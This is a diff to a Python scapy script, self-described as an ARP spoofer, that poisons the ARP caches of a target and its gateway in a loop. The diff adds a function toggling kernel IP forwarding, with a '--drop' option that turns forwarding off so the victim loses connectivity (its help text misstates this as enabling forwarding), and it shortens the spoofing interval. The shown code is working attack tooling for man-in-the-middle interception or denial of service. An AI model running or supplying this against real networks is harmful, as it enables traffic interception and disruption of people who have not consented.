@@ -3,6 +3,11 @@
 import scapy.all as scapy
 import time
 import argparse
+
+def set_iproute(value):
+    file_path = "/proc/sys/net/ipv4/ip_forward"
+    with open(file_path, "w") as f:
+        print(value, file=f)
   
 def get_mac(ip):
     arp_request = scapy.ARP(pdst = ip)
@@ -25,10 +30,16 @@ def main():
     parser = argparse.ArgumentParser(description='An arp spoofer python script')
     parser.add_argument('target', type=str, help='target ip')
     parser.add_argument('gateway', type=str, help='gateway ip')
+    parser.add_argument('--drop', help='enable ip forwarding', action='store_true')
     args = parser.parse_args()
 
     target_ip = args.target
     gateway_ip = args.gateway
+
+    if args.drop:
+        set_iproute(0)
+    else:
+        set_iproute(1)
 
     print("Arp Spoof Started")
       
@@ -39,7 +50,7 @@ def main():
             spoof(gateway_ip, target_ip)
             sent += 2
             print(f"Sent {sent} packets")
-            time.sleep(2)
+            time.sleep(1.5)
       
     except KeyboardInterrupt:
         print("\nCtrl + C pressed.............Exiting")
